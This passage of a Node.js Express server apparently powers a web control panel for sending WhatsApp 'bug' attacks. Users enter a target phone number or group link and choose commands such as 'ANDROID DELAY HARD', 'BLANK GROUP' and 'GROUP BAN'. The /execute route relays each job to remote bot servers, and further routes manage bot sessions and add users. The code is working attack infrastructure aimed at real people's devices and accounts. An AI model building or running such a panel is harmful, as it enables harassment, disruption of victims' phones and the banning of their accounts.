<option value="DelayHard">𝗔𝗡𝗗𝗥𝗢𝗜𝗗 𝗗𝗘𝗟𝗔𝗬 𝗛𝗔𝗥𝗗</option>
<option value="FuckGc">𝗕𝗟𝗔𝗡𝗞 𝗚𝗥𝗢𝗨𝗣</option>
<option value="finish">𝗚𝗥𝗢𝗨𝗣 𝗕𝗔𝗡</option>
</select>
</div>
<button class="btn-exec" id="execBtn" onclick="execute()">⚡ EXECUTE BUG</button>
<div id="result" class="result"></div>
</div>
<div class="section-title"><h2>Server Status</h2></div>
<div class="status-card">
<div class="status-header">
<span style="font-size:12px;font-weight:700;color:#fff;letter-spacing:1px;">REALTIME • LIVE MONITORING</span>
<span class="status-badge" id="serverStatusBadge">OFFLINE</span>
</div>
<div class="status-grid">
<div class="status-item"><div class="val" id="sOnline">0</div><div class="lbl">Online</div></div>
<div class="status-item"><div class="val" id="sConn">0</div><div class="lbl">Conn</div></div>
<div class="status-item"><div class="val" id="sBugs">10</div><div class="lbl">Bugs</div></div>
<div class="status-item"><div class="val" id="sBots">0</div><div class="lbl">Bots</div></div>
</div>
</div>
</div>
<div id="view-info" class="view-section">
<div class="section-title"><h2>System Info</h2></div>
<div class="feature-card"><p style="color:var(--text-muted);font-size:13px;line-height:1.8;">Device: Web Panel<br>Network: Online<br>Status: Active<br>Role: ${req.session.user.role.toUpperCase()}<br>Bots Configured: ${activeBots().length} / ${MAX_BOTS}</p></div>
</div>
<div id="view-tools" class="view-section">
${isOwner ? `
<div class="section-title"><h2>Bot API Config (4 Slots)</h2></div>
<div class="admin-card">${botCardsHtml}</div>

<!-- ===== BACKGROUND VIDEO SETTINGS START ===== -->
<div class="section-title"><h2>Background Video (4K)</h2></div>
<div class="admin-card">
  <p style="color:var(--text-muted);font-size:12px;margin-bottom:15px;">Paste any 4K MP4 URL into a slot. Save, then SET to make it the live background for login + dashboard.</p>
  
  <div style="background:rgba(0,230,118,.05);border:1px solid var(--neon-green);border-radius:12px;padding:16px;margin-bottom:14px;">
    <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:12px;">
      <span style="color:var(--neon-green);font-size:11px;font-weight:700;letter-spacing:1.5px;">SLOT 1</span>
      <span style="background:var(--neon-green);color:#000;font-size:9px;font-weight:800;padding:3px 8px;border-radius:10px;">● ACTIVE</span>
    </div>
    
    <!-- Preview Window -->
    <div style="width:100%;height:160px;background:#000;border-radius:8px;overflow:hidden;position:relative;margin-bottom:12px;">
      <video style="width:100%;height:100%;object-fit:cover;" autoplay muted loop playsinline>
        <source src="${config.backgroundVideoUrl}" type="video/mp4">
      </video>
      <div style="position:absolute;bottom:8px;left:8px;font-size:10px;font-family:'Share Tech Mono',monospace;color:rgba(255,255,255,.7);background:rgba(0,0,0,.6);padding:2px 6px;border-radius:4px;">0:00 / 0:58</div>
    </div>
    
    <div class="field">
      <label>LABEL</label>
      <input type="text" value="Default" readonly style="opacity:.7;">
    </div>
    
    <div class="field">
      <label>VIDEO URL (4K / MP4)</label>
      <input type="text" id="bgVideoUrlInput" placeholder="https://example.com/video.mp4" value="${config.backgroundVideoUrl}">
    </div>
    
    <div style="display:grid;grid-template-columns:2fr 1fr 1fr;gap:8px;">
      <button class="btn-exec" onclick="saveBgVideo()">💾 SAVE</button>
      <button class="btn-exec" style="background:rgba(255,255,255,.1);color:#fff;border:1px solid #444;" onclick="setBgActive()">ACTIVE</button>
      <button class="btn-exec" style="background:rgba(255,255,255,.1);color:#fff;border:1px solid #444;" onclick="document.getElementById('bgVideoUrlInput').value='';">×</button>
    </div>
    <div id="bgVideoResult" class="result" style="border-left-color:var(--neon-green);color:var(--neon-green);"></div>
  </div>
</div>
<!-- ===== BACKGROUND VIDEO SETTINGS END ===== -->

<div class="section-title"><h2>Owner Control</h2></div>
<div class="admin-card">
<div class="field"><label>Username</label><input type="text" id="newUser" placeholder="username"></div>
<div class="field"><label>Password</label><input type="password" id="newPass" placeholder="password"></div>
<div class="field"><label>Telegram ID</label><input type="text" id="newTg" placeholder="8387610260"></div>
<div class="field"><label>Role</label><select id="newRole"><option value="user">User</option><option value="owner">Owner</option></select></div>
<button class="btn-green" onclick="addUser()">ADD USER</button>
<div id="adminResult" class="result" style="color:var(--neon-green);border-left-color:var(--neon-green);"></div>
</div>` : '<div class="feature-card"><p style="color:var(--text-muted);text-align:center;">Access Denied</p></div>'}
</div>
<div id="view-theme" class="view-section">
<div class="section-title"><h2>Select Theme</h2></div>
<div class="theme-grid">
<div class="theme-card" data-theme="red" onclick="setTheme('red')"><div class="theme-preview" style="background:#ff2a4b;color:#ff2a4b;"></div><div class="theme-name">Cyber Red</div></div>
<div class="theme-card" data-theme="green" onclick="setTheme('green')"><div class="theme-preview" style="background:#00e676;color:#00e676;"></div><div class="theme-name">Matrix Green</div></div>
<div class="theme-card" data-theme="blue" onclick="setTheme('blue')"><div class="theme-preview" style="background:#00b0ff;color:#00b0ff;"></div><div class="theme-name">Cyber Blue</div></div>
<div class="theme-card" data-theme="purple" onclick="setTheme('purple')"><div class="theme-preview" style="background:#d500f9;color:#d500f9;"></div><div class="theme-name">Neon Purple</div></div>
</div>
</div>
</div>
<div class="bottom-nav">
<button class="nav-item active" onclick="switchView('home',this)"><span class="nav-icon">🏠</span>HOME</button>
<button class="nav-item" onclick="switchView('info',this)"><span class="nav-icon">ℹ️</span>INFO</button>
<div class="nav-fab" onclick="switchView('home',this);document.getElementById('target').focus();">🐛</div>
<button class="nav-item" onclick="switchView('tools',this)"><span class="nav-icon">🔧</span>TOOLS</button>
<button class="nav-item" onclick="switchView('theme',this)"><span class="nav-icon">🔥</span>THEME</button>
</div>
<script>
var allSessions=[];
var currentSelection={botIndex:0,sessionId:null};
const themes={
red:{'--neon-red':'#ff2a4b','--bg':'#050507','--panel-bg':'rgba(17,17,22,.85)','--text-main':'#ffffff','--text-muted':'#888888','--border-color':'rgba(255,42,75,.25)'},
green:{'--neon-red':'#00e676','--bg':'#050807','--panel-bg':'rgba(15,22,18,.85)','--text-main':'#ffffff','--text-muted':'#6b8f7b','--border-color':'rgba(0,230,118,.25)'},
blue:{'--neon-red':'#00b0ff','--bg':'#050814','--panel-bg':'rgba(10,18,30,.85)','--text-main':'#ffffff','--text-muted':'#5c7a99','--border-color':'rgba(0,176,255,.25)'},
purple:{'--neon-red':'#d500f9','--bg':'#0a050f','--panel-bg':'rgba(20,10,25,.85)','--text-main':'#ffffff','--text-muted':'#8a5c99','--border-color':'rgba(213,0,249,.25)'}
};
function setTheme(k){const t=themes[k];if(!t)return;for(const[x,v]of Object.entries(t)){document.documentElement.style.setProperty(x,v)}localStorage.setItem('shah_theme',k);document.querySelectorAll('.theme-card').forEach(c=>c.classList.remove('active'));const a=document.querySelector('.theme-card[data-theme="'+k+'"]');if(a)a.classList.add('active')}
setTheme(localStorage.getItem('shah_theme')||'red');

/* === Unlock video audio on first touch/click (dashboard) === */
(function(){
  var v = document.getElementById('dashVid');
  var unlocked = false;
  function unlockAudio(){
    if(unlocked) return;
    unlocked = true;
    v.muted = false;
    v.volume = 0.6;
    var p = v.play();
    if(p && p.catch) p.catch(function(){ v.muted = true; v.play().catch(function(){}); });
    document.removeEventListener('touchstart', unlockAudio);
    document.removeEventListener('click', unlockAudio);
    document.removeEventListener('keydown', unlockAudio);
  }
  document.addEventListener('touchstart', unlockAudio, {passive:true});
  document.addEventListener('click', unlockAudio);
  document.addEventListener('keydown', unlockAudio);
})();

function updateClock(){var n=new Date();document.getElementById('clock').textContent=String(n.getHours()).padStart(2,'0')+':'+String(n.getMinutes()).padStart(2,'0')+':'+String(n.getSeconds()).padStart(2,'0');document.getElementById('date').textContent=String(n.getDate()).padStart(2,'0')+'/'+String(n.getMonth()+1).padStart(2,'0')+'/'+n.getFullYear();document.getElementById('day').textContent=['Minggu','Senin','Selasa','Rabu','Kamis','Jumat','Sabtu'][n.getDay()]}
setInterval(updateClock,1000);updateClock();
function switchView(id,b){document.querySelectorAll('.view-section').forEach(e=>e.classList.remove('active'));document.getElementById('view-'+id).classList.add('active');document.querySelectorAll('.nav-item').forEach(e=>e.classList.remove('active'));if(b&&b.classList.contains('nav-item'))b.classList.add('active');else document.querySelector('.nav-item').classList.add('active')}
function openSidebar(){document.getElementById('sidebar').classList.add('open');document.getElementById('sidebarOverlay').classList.add('open')}
function closeSidebar(){document.getElementById('sidebar').classList.remove('open');document.getElementById('sidebarOverlay').classList.remove('open')}
async function loadSessions(){var l=document.getElementById('sessionsList');if(!l)return;l.innerHTML='<div style="text-align:center;padding:20px;color:#555;font-size:12px;"><span class="loader"></span> Loading...</div>';try{var r=await fetch('/api/sessions');var d=await r.json();if(!d.success){l.innerHTML='<div class="result" style="display:block;color:#ff3355;">'+d.message+'</div>';return}allSessions=d.sessions||[];currentSelection=d.current||{botIndex:0,sessionId:null};renderSessions();updateCurrent();document.getElementById('statOnline').textContent=d.onlineUsers||0;document.getElementById('statConn').textContent=d.activeConnections||0;document.getElementById('statBots').textContent=d.liveBots||0;document.getElementById('sOnline').textContent=d.onlineUsers||0;document.getElementById('sConn').textContent=d.activeConnections||0;document.getElementById('sBots').textContent=d.liveBots||0;var b=document.getElementById('serverStatusBadge');if((d.liveBots||0)>0){b.textContent='ONLINE';b.classList.add('online')}else{b.textContent='OFFLINE';b.classList.remove('online')}}catch(e){l.innerHTML='<div class="result" style="display:block;color:#ff3355;">Error: '+e.message+'</div>'}}
function renderSessions(){var l=document.getElementById('sessionsList');if(!allSessions.length){l.innerHTML='<div style="text-align:center;padding:20px;color:#555;font-size:12px;">No sessions found</div>';return}var h='';allSessions.forEach(function(s){var on=s.status==='open';var a=(s.botIndex===currentSelection.botIndex&&s.id===currentSelection.sessionId);h+='<div class="session-item '+(a?'active':'')+'" onclick="selectSession('+s.botIndex+',\\''+String(s.id).replace(/'/g,"\\\\'")+'\\')"><div style="flex:1;"><div class="id">'+s.id+'</div><div class="name">'+s.botLabel+' • '+(s.name||'—')+'</div></div><div class="dot '+(on?'dot-on':'dot-off')+'"></div></div>'});l.innerHTML=h}
function updateCurrent(){var e=document.getElementById('currentSessionValue');if(!e)return;if(currentSelection&&currentSelection.sessionId==='ALL'){e.textContent='🌐 ALL SESSIONS SELECTED';e.style.color='var(--neon-green)'}else if(currentSelection&&currentSelection.sessionId){e.textContent='[Bot '+(currentSelection.botIndex+1)+'] '+currentSelection.sessionId;e.style.color='var(--neon-green)'}else{e.textContent='No session selected';e.style.color='#666'}}
async function selectSession(bi,id){try{var r=await fetch('/api/select-session',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({botIndex:bi,sessionId:id})});var d=await r.json();if(d.success){currentSelection={botIndex:bi,sessionId:id};renderSessions();updateCurrent()}else alert(d.message||'Selection failed')}catch(e){alert('Error: '+e.message)}}
async function selectAllSessions() {
  try {
    var r = await fetch('/api/select-all', { method: 'POST' });
    var d = await r.json();
    if (d.success) {
      loadSessions();
      alert("✅ All sessions selected successfully!");
    } else {
      alert(d.message || "Failed to select all");
    }
  } catch (e) {
    alert("Error: " + e.message);
  }
}
async function execute(){var t=document.getElementById('target').value.trim();var c=document.getElementById('command').value;var b=document.getElementById('execBtn');var r=document.getElementById('result');if(!t){r.style.display='block';r.style.color='#ff3355';r.textContent='Enter target number or group link';return}b.disabled=true;b.innerHTML='<span class="loader"></span>EXECUTING';r.style.display='block';r.style.color='#ffaa00';r.textContent='Sending...';try{var res=await fetch('/execute',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({target:t,command:c,botIndex:currentSelection.botIndex})});var d=await res.json();r.style.color=d.success?'var(--neon-green)':'#ff3355';r.textContent=d.message}catch(e){r.style.color='#ff3355';r.textContent='Error: '+e.message}b.disabled=false;b.innerHTML='⚡ EXECUTE BUG'}
async function saveApiConfig(i){var u=document.getElementById('cfgUrl'+i).value.trim();var k=document.getElementById('cfgKey'+i).value.trim();var lb=document.getElementById('cfgLabel'+i).value.trim();var r=document.getElementById('cfgResult'+i);var s=document.getElementById('cfgStatus'+i);if(!u||!k){r.style.display='block';r.style.color='#ff3355';r.textContent='Fill URL and Key';return}try{var res=await fetch('/admin/api-config',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({index:i,url:u,key:k,label:lb})});var d=await res.json();r.style.display='block';r.style.color=d.success?'var(--neon-green)':'#ff3355';r.textContent=d.message;if(d.success){s.className='config-status ok';s.textContent='✓ BOT '+(i+1)+' CONFIGURED';loadSessions()}}catch(e){r.style.display='block';r.style.color='#ff3355';r.textContent='Error: '+e.message}}
async function clearApiConfig(i){if(!confirm('Clear Bot '+(i+1)+' config?'))return;try{var res=await fetch('/admin/api-config',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({index:i,url:'',key:'',label:''})});var d=await res.json();var r=document.getElementById('cfgResult'+i);var s=document.getElementById('cfgStatus'+i);r.style.display='block';r.style.color=d.success?'var(--neon-green)':'#ff3355';r.textContent=d.message;if(d.success){document.getElementById('cfgUrl'+i).value='';document.getElementById('cfgKey'+i).value='';s.className='config-status bad';s.textContent='✕ BOT '+(i+1)+' NOT CONFIGURED';loadSessions()}}catch(e){}}

/* === Background Video Save Functions === */
async function saveBgVideo() {
  var url = document.getElementById('bgVideoUrlInput').value.trim();
  var r = document.getElementById('bgVideoResult');
  if (!url) {
    r.style.display = 'block';
    r.style.color = '#ff3355';
    r.textContent = 'Please enter a valid video URL';
    return;
  }
  try {
    var res = await fetch('/admin/bg-video', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ url: url })
    });
    var d = await res.json();
    r.style.display = 'block';
    r.style.color = d.success ? 'var(--neon-green)' : '#ff3355';
    r.textContent = d.message;
    if (d.success) {
      // Update live videos immediately without page reload
      document.querySelectorAll('.login-bg video, .dashboard-bg video').forEach(v => {
        v.querySelector('source').src = url;
        v.load();
        v.play().catch(()=>{});
      });
    }
  } catch (e) {
    r.style.display = 'block';
    r.style.color = '#ff3355';
    r.textContent = 'Error: ' + e.message;
  }
}

function setBgActive() {
  var url = document.getElementById('bgVideoUrlInput').value.trim();
  if(!url) return;
  document.querySelectorAll('.login-bg video, .dashboard-bg video').forEach(v => {
    v.querySelector('source').src = url;
    v.load();
    v.play().catch(()=>{});
  });
  var r = document.getElementById('bgVideoResult');
  r.style.display = 'block';
  r.style.color = 'var(--neon-green)';
  r.textContent = '✅ Video set to active for this session (Click SAVE to make permanent)';
}

async function addUser(){var u=document.getElementById('newUser').value.trim();var p=document.getElementById('newPass').value.trim();var tg=document.getElementById('newTg').value.trim();var ro=document.getElementById('newRole').value;var o=document.getElementById('adminResult');if(!u||!p){o.style.display='block';o.style.color='#ff3355';o.textContent='Fill all fields';return}try{var res=await fetch('/admin/adduser',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({username:u,password:p,role:ro,telegramId:tg})});var d=await res.json();o.style.display='block';o.style.color=d.success?'var(--neon-green)':'#ff3355';o.textContent=d.message}catch(e){o.style.display='block';o.style.color='#ff3355';o.textContent='Error: '+e.message}}
loadSessions();setInterval(loadSessions,10000);
</script>
</body></html>`);
});

app.post("/execute", requireLogin, async (req, res) => {
  const { target, command } = req.body;
  if (!target || !command) return res.json({ success: false, message: "Missing target or command" });
  
  const isGroup = target.includes("chat.whatsapp.com/") || target.endsWith("@g.us");
  let cleanTarget = target;

  if (!isGroup) {
    cleanTarget = target.replace(/[^0-9]/g, "");
    if (cleanTarget.length < 10) return res.json({ success: false, message: "Invalid number" });
  }

  const bots = activeBots();
  if (!bots.length) return res.json({ success: false, message: "No bot APIs configured" });

  let bi = typeof req.body.botIndex === "number" ? req.body.botIndex : currentSelection.botIndex;
  let chosen = getBot(bi);
  if (!chosen) chosen = bots[0];

  try {
    await axios.post(
      chosen.url + "/api/execute",
      {
        target: cleanTarget,
        command,
        user: req.session.user.username,
        telegramId: req.session.user.telegramId || null,
      },
      { headers: { "x-api-key": chosen.key, "Content-Type": "application/json" }, timeout: 15000 }
    );
    res.json({
      success: true,
      message:
        "Job sent via [" + (chosen.label || "Bot " + (chosen.index + 1)) + "]\nTarget: " + cleanTarget + "\nCommand: /" + command,
    });
  } catch (e) {
    const m = e.response && e.response.data && e.response.data.message ? e.response.data.message : e.message;
    res.json({ success: false, message: "Bot server error: " + m });
  }
});

app.get("/api/sessions", requireLogin, requireOwner, async (req, res) => {
  const bots = activeBots();
  if (!bots.length) return res.json({ success: false, message: "No bot APIs configured" });

  const mergedSessions = [];
  let totalOnline = 0;
  let liveBots = 0;

  await Promise.all(
    bots.map(async (b) => {
      try {
        const r = await axios.get(b.url + "/api/sessions", {
          headers: { "x-api-key": b.key },
          timeout: 10000,
        });
        const data = r.data;
        if (!data || !data.success) return;
        liveBots++;
        const botLabel = b.label || "Bot " + (b.index + 1);
        const sessions = data.sessions || [];
        const open = sessions.filter((s) => s.status === "open").length;
        totalOnline += open;
        sessions.forEach((s) => {
          mergedSessions.push({
            id: s.id,
            name: s.name,
            status: s.status,
            botIndex: b.index,
            botLabel,
          });
        });
      } catch (e) {}
    })
  );

  const stillValid = mergedSessions.find(
    (s) => s.botIndex === currentSelection.botIndex && s.id === currentSelection.sessionId
  );
  if (!stillValid && currentSelection.sessionId !== 'ALL') {
    const open = mergedSessions.find((s) => s.status === "open");
    if (open) {
      currentSelection = { botIndex: open.botIndex, sessionId: open.id };
      saveConfig();
    } else {
      currentSelection = { botIndex: 0, sessionId: null };
    }
  }

  res.json({
    success: true,
    sessions: mergedSessions,
    current: currentSelection,
    onlineUsers: totalOnline,
    activeConnections: totalOnline,
    liveBots,
    totalBots: bots.length,
  });
});

app.post("/api/select-session", requireLogin, requireOwner, async (req, res) => {
  const { botIndex, sessionId } = req.body;
  const bi = parseInt(botIndex, 10);
  if (isNaN(bi) || bi < 0 || bi >= MAX_BOTS) return res.json({ success: false, message: "Invalid bot index" });
  if (!sessionId) return res.json({ success: false, message: "Missing session" });

  const b = getBot(bi);
  if (!b) return res.json({ success: false, message: "Bot " + (bi + 1) + " not configured" });

  try {
    const r = await axios.post(
      b.url + "/api/select-session",
      { session: sessionId },
      { headers: { "x-api-key": b.key, "Content-Type": "application/json" }, timeout: 10000 }
    );
    if (r.data && r.data.success) {
      currentSelection = { botIndex: bi, sessionId };
      saveConfig();
      res.json({ success: true, message: "Selected [" + (b.label || "Bot " + (bi + 1)) + "] " + sessionId });
    } else {
      res.json({ success: false, message: (r.data && r.data.message) || "Bot rejected session" });
    }
  } catch (e) {
    const m = e.response && e.response.data && e.response.data.message ? e.response.data.message : e.message;
    res.json({ success: false, message: "Bot error: " + m });
  }
});

app.post("/api/select-all", requireLogin, requireOwner, async (req, res) => {
  const bots = activeBots();
  if (!bots.length) return res.json({ success: false, message: "No bot APIs configured" });

  let successCount = 0;
  await Promise.all(bots.map(async (b) => {
    try {
      const r = await axios.post(
        b.url + "/api/select-all",
        {},
        { headers: { "x-api-key": b.key }, timeout: 10000 }
      );
      if (r.data && r.data.success) successCount++;
    } catch (e) {}
  }));

  if (successCount > 0) {
    currentSelection = { botIndex: 0, sessionId: "ALL" };
    saveConfig();
    res.json({ success: true, message: "ALL sessions selected across " + successCount + " bot(s)" });
  } else {
    res.json({ success: false, message: "Failed to reach any bot to select all" });
  }
});

app.post("/admin/api-config", requireOwner, (req, res) => {
  const { index, url, key, label } = req.body;
  const i = parseInt(index, 10);
  if (isNaN(i) || i < 0 || i >= MAX_BOTS) return res.json({ success: false, message: "Invalid slot" });
  config.bots[i].url = (url || "").replace(/\/$/, "");
  config.bots[i].key = key || "";
  config.bots[i].label = (label || "Bot " + (i + 1)).trim() || "Bot " + (i + 1);
  saveConfig();
  const configured = !!(config.bots[i].url && config.bots[i].key);
  res.json({
    success: true,
    message:
      (configured ? "Bot " + (i + 1) + " saved" : "Bot " + (i + 1) + " cleared") +
      "\nURL: " +
      (config.bots[i].url || "(empty)"),
  });
});

app.post("/admin/bg-video", requireOwner, (req, res) => {
  const { url } = req.body;
  if (!url) return res.json({ success: false, message: "Invalid URL" });
  
  config.backgroundVideoUrl = url;
  saveConfig();
  
  res.json({
    success: true,
    message: "✅ Background video updated successfully!\nURL: " + url
  });
});

app.post("/admin/adduser", requireOwner, (req, res) => {
  const { username, password, role, telegramId } = req.body;
  if (!username || !password) return res.json({ success: false, message: "Fill all fields" });
  const users = JSON.parse(fs.readFileSync(USERS_FILE, "utf8"));
  if (users.find((u) => u.username === username)) return res.json({ success: false, message: "Username exists" });
  const hash = bcrypt.hashSync(password, 10);
  users.push({ username, password: hash, role: role || "user", telegramId: telegramId || null });
  fs.writeFileSync(USERS_FILE, JSON.stringify(users, null, 2));
  res.json({ success: true, message: "User " + username + " added as " + (role || "user") });
});

app.listen(PORT, "0.0.0.0", () => console.log("WEB PANEL ON PORT " + PORT));
